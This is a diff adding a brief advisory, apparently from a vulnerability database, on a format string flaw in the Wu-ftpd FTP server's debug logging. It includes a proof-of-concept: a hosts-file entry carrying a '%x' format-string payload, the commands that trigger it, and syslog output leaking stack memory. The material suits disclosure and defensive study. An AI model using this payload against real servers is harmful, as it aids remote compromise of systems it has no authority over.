@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/2296/info
+
+Wu-ftpd is a widely used unix ftp server. It contains a format string vulnerability that may be exploitable under certain (perhaps 'extreme') circumstances.
+
+When running in debug mode, Wu-ftpd logs user activity to syslog in an insecure manner. An attacker with control over the server's hostname resolving facility could exploit this vulnerability to get root access remotely on the victim host. 
+
+The following example demonstrates the vulnerability.
+
+Note: /etc/hosts is used as the example name resolving mechanism. Could be DNS, NIS, etc.
+
+Conditions:
+
+$ grep 127.0.0.1 /etc/hosts
+127.0.0.1 %x%x%x%x%x%x%x%x%x%x
+
+$ grep ftpd /etc/inetd.conf
+ftp stream tcp nowait root /usr/sbin/tcpd /tmp/wuftpd-2.6.0/src/ftpd -v
+
+$ ncftpget -F 127.0.0.1 /tmp /usr/lib/ld.so
+
+$ tail /var/log/syslog.debug
+
+Jan 24 14:17:01 xxx ftpd[30912]: PASV port 47479 assigned to 80862b0806487eb9778084da87bffff16c9640151020bfffe108401c9004 [127.0.0.1]
+
+..<snip extra output>.. 
